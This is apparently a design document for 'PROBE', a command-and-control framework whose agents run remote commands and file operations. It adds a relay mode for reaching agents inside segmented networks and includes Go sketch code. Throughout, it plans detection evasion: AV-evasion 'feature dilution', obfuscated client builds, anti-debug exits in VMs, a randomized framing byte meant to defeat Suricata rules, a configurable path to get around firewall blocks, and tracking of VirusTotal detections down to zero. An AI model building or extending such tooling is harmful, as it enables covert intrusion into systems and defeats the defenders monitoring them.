# PROBE Unified Binary Design

## Overview

Merge `cmd/probe-server` and `cmd/probe-client` into a single `cmd/probe` binary with three runtime modes: **serve**, **connect**, and **relay**. The relay mode enables network traversal of segmented environments by bridging agents that cannot reach the server directly.

```
                    [PROBE serve]
                    (top server, public IP)
                         |
                    WAN (internet)
                         |
            ┌────────────┴────────────┐
            |                         |
      [probe connect]           [probe relay]
      (direct WAN agent)        (dual-homed: WAN + LAN)
                                   |
                              LAN (no internet)
                                   |
                          ┌────────┴────────┐
                          |                 |
                    [probe connect]    [probe connect]
                    (LAN-only agent)   (LAN-only agent)
```

## CLI Interface

```
# Server mode — top of tree, listens for agents + operators
probe serve [--addr :7700] [--token ...] [--cert-file ...] [--key-file ...]
            [--admin-password ...] [--allowed-cidr ...] [--vt-api-key ...]

# Client mode — leaf agent, connects to nearest server/relay
probe connect --config probe-client.json
              # or embedded config via -ldflags

# Relay mode — bridge: listens downstream + connects upstream
probe relay --upstream wss://top-server:7700/ws --token ... \
            --listen :7701 [--cert-file ...] [--key-file ...]

# Version
probe --version
```

## Current Architecture

```
cmd/probe-server/main.go     → internal/server  (HTTP + WS server, WebUI, API)
cmd/probe-client/main.go     → internal/agent   (WS client, command handler)

internal/protocol/           → message types (Envelope, TypeExec, TypeFSList, ...)
internal/platform/           → OS-specific helpers
internal/features/           → feature dilution (legit code shell for AV evasion)
internal/server/             → server logic (registry, audit, tasks, transfers, tunnel, etc.)
internal/agent/              → agent logic (command handlers, reconnect, heartbeat)
```

## Target Architecture

```
cmd/probe/main.go            → subcommand dispatch (serve/connect/relay)
internal/server/             → unchanged (used by serve mode)
internal/agent/              → unchanged (used by connect mode)
internal/relay/              → NEW — relay multiplexer (used by relay mode)
internal/protocol/           → unchanged
internal/platform/           → unchanged
internal/features/           → unchanged
```

## Relay Design — Option A: Transparent WebSocket Proxy

The relay is a **WebSocket multiplexer**. It simultaneously acts as:
- **Server** (downstream): accepts WebSocket connections from agents
- **Client** (upstream): maintains a single WebSocket connection to the server

The relay does NOT parse protocol messages. It forwards raw bytes with a simple channel-ID framing layer.

### Framing Protocol

All messages on the relay→server upstream WebSocket are framed as:

```
[1 byte: magic (dynamic, negotiated at relay registration)] [4 bytes: channelID (big-endian uint32)] [N bytes: payload]
```

- `channelID = 0` → relay control messages (JSON payload: `{"type":"relay_register","relay_id":"...","token":"..."}`, `{"type":"channel_open","channel_id":N}`, `{"type":"channel_close","channel_id":N}`)
- `channelID > 0` → agent data (payload is the raw WebSocket message from/to that agent)

**Magic byte is NOT hardcoded 0x01** — it is generated at relay startup (random byte 0x02-0xFF) and sent to the server in the relay registration handshake. This prevents Suricata rules from matching a fixed byte at offset 0. The server learns the magic byte from the first binary message it receives on a new connection and uses it for all subsequent framing on that connection.

**Relay detection**: Server uses `conn.ReadMessage()` (not `ReadJSON()`) as the first read. If `messageType == BinaryMessage`, enter relay mode. If `messageType == TextMessage`, parse as JSON Envelope (existing direct-agent path). This is robust — no magic byte heuristic needed for detection, the WebSocket message type is the discriminator.

### Channel Lifecycle

```
Agent connects to relay
  → Relay allocates channelID (atomic counter, wraps at uint32 max)
  → Relay sends control message to server: {channelID: N, type: "channel_open"}
  → Relay pipes agent ↔ server on channelID N

Agent disconnects from relay
  → Relay sends control message: {channelID: N, type: "channel_close"}
  → Relay frees channelID N

Relay upstream disconnects
  → Relay attempts reconnect with exponential backoff (same as agent client)
  → On reconnect, re-registers all active channels
  → Agents will disconnect after 45s (pingInterval=15s × missThreshold=3) if upstream is still down
  → On relay reconnect, agents reconnect automatically via their own backoff
  → Messages sent during upstream outage are buffered per-channel (256 message queue, overflow closes channel)
```

### Server-Side Changes (Minimal)

The server's WebSocket handler (`server_ws.go`) needs a small addition:

1. **Detect relay connections**: Use `conn.ReadMessage()` as first read (not `ReadJSON()`). If `messageType == BinaryMessage`, enter relay mode. If `messageType == TextMessage`, parse as JSON Envelope (existing path).

2. **Relay mode**: For relay connections, the server maintains a `relaySession` struct with a shared `sync.Mutex` for all writes on that physical WebSocket. Each virtual connection (`virtualConn`) implements the same write semantics as a direct agent connection, but internally acquires the relaySession's shared writeMu before framing and writing. This prevents concurrent write panics on the shared WebSocket.

3. **Agent registration**: When a relay sends `channel_open` with agent registration data, the server registers the agent identically to a direct connection. Agent IDs use `relayID/agentName` (slash separator, not hyphen) to avoid collision with direct agent names. The `relayID` is a UUID generated at relay startup (configurable via `--relay-id` flag).

### What Does NOT Change

- `internal/protocol/` — message types stay the same
- `internal/agent/` — agent code stays the same, agent doesn't know it's behind a relay
- `internal/server/` command handlers — they see agent connections, don't know if direct or relayed
- WebUI — no changes needed (server presents relayed agents identically to direct ones)
- Agent builder — no changes (agents still connect to `wss://relay-host:7701/ws`)

### Authentication

```
Agent → Relay:    Agent uses its token. Relay validates token locally against
                  configured allowed tokens (NOT pass-through). This closes
                  the open-proxy vulnerability — unauthenticated connections
                  are rejected with 401 at the relay, never reaching the server.

Relay → Server:   Relay authenticates with its own relay token.
                  Server accepts relay token like any agent token.
                  Server marks this connection as "relay" type.
```

**Token separation is enforced**: relay has its own token set (configurable via `--agent-tokens` flag). Agent tokens at the relay are separate from the relay→server token. If an operator reuses tokens, the relay still validates locally — the open proxy problem is closed.

### Rate Limiting

- Relay limits downstream connections: max 100 concurrent (configurable via `--max-agents`)
- Per-IP limit: max 10 connections from same IP (configurable)
- Excess connections get 429 Too Many Requests

### WebSocket Keepalive

- WS-level ping every 30s on both relay legs (agent↔relay, relay↔server)
- Relay responds to WS-level pings locally (standard gorilla behavior)
- Prevents NAT timeout on idle connections

### TLS Handling

- **Agent → Relay**: Relay terminates TLS (presents its own cert or uses self-signed)
- **Relay → Server**: Relay connects with TLS (verifies server cert or uses CA pinning)
- **End-to-end**: No end-to-end encryption in Option A. The relay can see plaintext. This is acceptable for the initial implementation. End-to-end encryption (agent ↔ server, relay can't read) is deferred to Option B.

### Backpressure

- Each downstream agent has a buffered channel (size 64 messages)
- If the upstream is slow, agent channels fill up and block the relay's read goroutine for that agent
- The agent's WebSocket write will eventually time out (60s default), causing the agent to disconnect and reconnect
- This is acceptable — it means the network path is saturated and the agent should back off

### Reconnection

When the relay's upstream connection drops:
1. Relay enters exponential backoff (1s → 2s → 4s → ... → 60s cap)
2. Relay stops accepting new downstream connections (returns 503 on WebSocket upgrade)
3. Existing downstream agents remain connected to relay (relay buffers heartbeats)
4. On upstream reconnect, relay re-registers all active channels
5. If any channel's agent has disconnected during the outage, relay sends `channel_close`

## Migration Phases

### Phase 1: Merge Binaries + Build Tag Separation (v1.5.0 — DONE)

**Goal**: Single `cmd/probe` source tree with `serve`, `connect`, and `relay` subcommands, compiled into three build variants via Go build tags.

**Build tag system**:
- **Default (client-only)**: `go build -trimpath` → `probe connect` only (~9.6 MB). Server and relay code excluded via `serve_stub.go` and `relay_stub.go` which print a helpful error if the mode is invoked.
- **Server**: `go build -trimpath -tags server` → `probe serve` + `probe connect` (~11.1 MB).
- **Relay**: `go build -trimpath -tags relay` → `probe relay` + `probe connect` (~9.7 MB).

**Files created**:
- `cmd/probe/main.go` — subcommand dispatch using `os.Args[1]`
- `cmd/probe/serve.go` — server mode (build tag: `+build server`)
- `cmd/probe/connect.go` — client mode (always compiled)
- `cmd/probe/relay.go` — relay mode (build tag: `+build relay`)
- `cmd/probe/serve_stub.go` — stub for client-only builds, prints error if `serve` invoked
- `cmd/probe/relay_stub.go` — stub for client-only builds, prints error if `relay` invoked
- `cmd/probe-server/main.go` — deleted
- `cmd/probe-client/main.go` — deleted

**Key decisions**:
- Extract flag parsing into per-mode functions
- Share `appVersion` constant
- `probe serve` → calls `runServe()` with all server flags
- `probe connect` → calls `runConnect()` with client config
- `probe relay` → calls `runRelay()` with relay flags
- `probe --version` → prints version
- `probe` (no args) → prints usage with build tag requirements per subcommand
- Obfuscation tool `isServerCmd()` updated to skip both `serve.go` and `relay.go` in `cmd/probe/`, ensuring client-only binaries get full obfuscation

**Security benefit**: Endpoints only receive the client-only binary — server and relay code is excluded at compile time, reducing the RE surface. The previous v1.4.0 unified binary (all 3 modes in one binary) had 1/67 Microsoft Wacatac detection; the client-only build tag variant has 0 detections.

**Testing**:
- `go build -trimpath` → `probe serve` prints stub error, `probe connect` works
- `go build -trimpath -tags server` → `probe serve --addr :7700 --admin-password admin` starts, `probe connect` works
- `go build -trimpath -tags relay` → `probe relay` works, `probe connect` works
- `probe --version` → prints `PROBE v1.5.0`

### Phase 2: Add Relay Mode

**Goal**: `probe relay` bridges agents to server.

**Files to create**:
- `internal/relay/relay.go` — relay struct, Run(), listen + dial logic
- `internal/relay/mux.go` — channel multiplexer, framing, channelID allocation
- `internal/relay/reconnect.go` — upstream reconnection with backoff
- `cmd/probe/relay.go` — relay subcommand, flag parsing

**Files to modify**:
- `internal/server/server_ws.go` — add relay connection detection and virtual channel handling (~100 lines)
- `internal/server/registry.go` — agents behind relay are registered with metadata `via_relay: relayID`

**Relay implementation sketch** (~200 lines):
```go
package relay

type Relay struct {
    upstreamURL string
    listenAddr  string
    token       string
    upstream    *websocket.Conn
    channels    sync.Map // channelID → *websocket.Conn (downstream agent)
    nextChanID  atomic.Uint32
}

func (r *Relay) Run() error {
    // 1. Connect to upstream
    r.connectUpstream()
    
    // 2. Listen for downstream agents
    http.HandleFunc("/ws", r.handleDownstream)
    http.ListenAndServe(r.listenAddr, nil)
}

func (r *Relay) handleDownstream(w, req) {
    // Upgrade to WebSocket
    conn := upgrader.Upgrade(w, req, nil)
    
    // Allocate channel ID
    chanID := r.nextChanID.Add(1)
    r.channels.Store(chanID, conn)
    
    // Send channel_open to server
    r.sendControl(chanID, "channel_open")
    
    // Pipe: agent → relay → server
    go r.pipeAgentToServer(conn, chanID)
    
    // Pipe: server → relay → agent (handled by r.dispatchFromServer)
}

func (r *Relay) pipeAgentToServer(conn, chanID) {
    for {
        _, data, err := conn.ReadMessage()
        if err != nil { r.closeChannel(chanID); return }
        r.sendFramed(chanID, data) // [0x01][chanID][data]
    }
}

func (r *Relay) dispatchFromServer() {
    for {
        _, frame, err := r.upstream.ReadMessage()
        if err != nil { r.reconnectUpstream(); continue }
        
        // Parse frame: [version][chanID][payload]
        chanID := binary.BigEndian.Uint32(frame[1:5])
        payload := frame[5:]
        
        if chanID == 0 {
            r.handleControl(payload) // heartbeat, channel_close ack
            continue
        }
        
        // Forward to downstream agent
        if conn, ok := r.channels.Load(chanID); ok {
            conn.(*websocket.Conn).WriteMessage(websocket.BinaryMessage, payload)
        }
    }
}
```

### Phase 3: Testing

**Test setup** (3 PROBE instances on one machine):
```bash
# Terminal 1: Top server
probe serve --addr :7700 --admin-password admin

# Terminal 2: Relay (connects to server, listens on :7701)
probe relay --upstream ws://localhost:7700/ws --token <relay-token> --listen :7701

# Terminal 3: Agent behind relay
probe connect --config agent-behind-relay.json
# agent-behind-relay.json: { "server": "ws://localhost:7701/ws", "token": "..." }
```

**Verify**:
- Agent appears in server's WebUI agent list
- Terminal commands work through relay
- File operations work through relay
- Kill relay → agent shows as disconnected → restart relay → agent reconnects
- Multiple agents behind same relay → both appear in WebUI

### Phase 4 (Deferred): Option B — Aware Relay

- Relay sends metadata to server: relay ID, agent count, topology info
- Server maintains routing table: agent → relay chain
- WebUI shows topology graph (tree view of relay chains)
- End-to-end encryption (agent ↔ server, relay can't read)
- Relay failover (agent can try multiple relay addresses)
- Relay remote management (server can tell relay to drop an agent)

## Code Structure Summary

| File | Action | Purpose |
|------|--------|---------|
| `cmd/probe/main.go` | NEW | Subcommand dispatch |
| `cmd/probe/serve.go` | NEW | Server mode, build tag `server` |
| `cmd/probe/connect.go` | NEW | Client mode (always compiled) |
| `cmd/probe/relay.go` | NEW | Relay mode, build tag `relay` |
| `cmd/probe/serve_stub.go` | NEW | Stub for client-only builds |
| `cmd/probe/relay_stub.go` | NEW | Stub for client-only builds |
| `internal/relay/relay.go` | NEW | Relay core logic (Phase 2) |
| `internal/relay/mux.go` | NEW | Channel multiplexer (Phase 2) |
| `internal/server/server_ws.go` | MODIFY | Relay connection detection (Phase 2) |
| `cmd/probe-server/main.go` | DELETE | Merged into cmd/probe |
| `cmd/probe-client/main.go` | DELETE | Merged into cmd/probe |

## Dependencies

No new external dependencies. Uses existing:
- `github.com/gorilla/websocket` — WebSocket client + server
- `encoding/binary` — channel ID framing
- `sync` — concurrent channel map
- `net/http` — downstream listener

## Security Considerations

1. **Relay token** — relay authenticates with server using its own token. Server validates via existing token mechanism.
2. **Agent token at relay** — relay validates agent tokens locally (NOT pass-through). Unauthenticated connections rejected at relay, never reaching server. This closes the open-proxy vulnerability.
3. **TLS** — relay terminates TLS for downstream agents, uses TLS for upstream. Self-signed certs acceptable for internal relay deployment. Do NOT reuse the same self-signed cert across deployments — each relay gets its own cert to prevent fingerprint tracking.
4. **No end-to-end encryption in Phase 2** — relay can see all traffic including tokens, command outputs, file contents. Relay compromise = full MITM. Mitigation: E2E encryption (Phase 4). Document this risk explicitly to operators.
5. **Relay compromise** — if relay is compromised, attacker can see all agent traffic, harvest tokens, and inject commands. Mitigation: E2E encryption (Phase 4), relay token rotation, separate token sets per relay.
6. **Single binary RE exposure — resolved by build tags (v1.5.0)**: The v1.4.0 concern about merging server+client+relay into one binary (capturing any single binary reveals the entire platform code) is resolved by build tag separation. Client-only binaries exclude server and relay code at compile time. The obfuscation tool covers all variants. VT scan before deployment remains mandatory.
7. **Configurable WS path** — the `/ws` path should be configurable per-deployment (`--ws-path /custom`) to prevent a single firewall rule from blocking all PROBE traffic.

## AV/Evasion Considerations

1. **Obfuscation tool updated (v1.5.0)**: `isServerCmd()` now skips both `serve.go` and `relay.go` in `cmd/probe/`, ensuring client-only builds get full obfuscation without server/relay code. The v1.4.0 concern about directory pattern matching is resolved — the obfuscation tool now recognizes the unified binary structure.
2. **Anti-debug must be mode-aware**: The evasion package's `init()` runs before `main()` for ALL modes. Running `probe serve` in a VM/VPS will trigger `os.Exit(0)` and kill the server. Fix: anti-debug init checks runtime mode — only fires for `connect` and `relay`, skips `serve`.
3. **Capability footprint reduced by build tags (v1.5.0)**: The v1.4.0 unified binary had WebSocket client + WebSocket server + HTTP server + relay multiplexer in one binary. With build tag separation, client-only binaries contain only the WebSocket client — the gorilla `Upgrader` struct and server-side signatures are excluded. Server and relay builds retain the broader footprint but are deployed only on trusted infrastructure.
4. **Dynamic magic byte**: The framing protocol uses a randomly-generated magic byte (not hardcoded 0x01) to prevent Suricata signature matching. XOR string encryption doesn't cover numeric constants — the dynamic byte approach solves this.
5. **Build tag separation fixes RE exposure (v1.5.0)**: The v1.4.0 concern about single-binary RE exposure (all 3 modes in one binary, 1/67 Microsoft Wacatac detection) is resolved by build tag separation. Client-only binaries exclude server and relay code at compile time — endpoints receive minimal-capability binaries with smaller footprint and 0 VT detections. Server and relay binaries are deployed only on trusted infrastructure. VT scan remains mandatory before deployment.